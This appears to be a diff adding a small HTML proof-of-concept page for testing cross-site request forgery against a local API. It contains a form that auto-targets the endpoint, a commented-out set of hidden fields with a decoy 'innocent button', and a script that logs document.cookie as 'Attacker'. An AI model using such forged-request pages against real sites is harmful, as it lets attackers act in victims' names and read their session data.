@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Trying CSRF</title>
+</head>
+<body>
+    <h1>Welcome!</h1>
+    
+    <form action="http://localhost:5234/api/csrf-test" method="POST">
+        <!-- <input type="hidden" name="name" value="🔥 CSRF TEST">
+        <input type="hidden" name="address" value="Attacker Street">
+        <input type="hidden" name="phoneNumber" value="0000000000">
+        <input type="hidden" name="email" value="csrf@test.com">
+        <input type="hidden" name="description" value="Created by CSRF experiment">
+        <input type="hidden" name="isOpen" value="false">
+        <input type="hidden" name="logo" value="">
+    
+        <button type="submit">
+            Click this innocent button 😇
+        </button> -->
+        <input  name="message" value="🔥 CSRF TEST" />
+        
+        <button type="submit">
+            Send CSRF Request
+        </button>
+    </form>
+    <script>
+        console.log("Attacker document.cookie:", document.cookie);
+    </script>
+</body>
+</html>
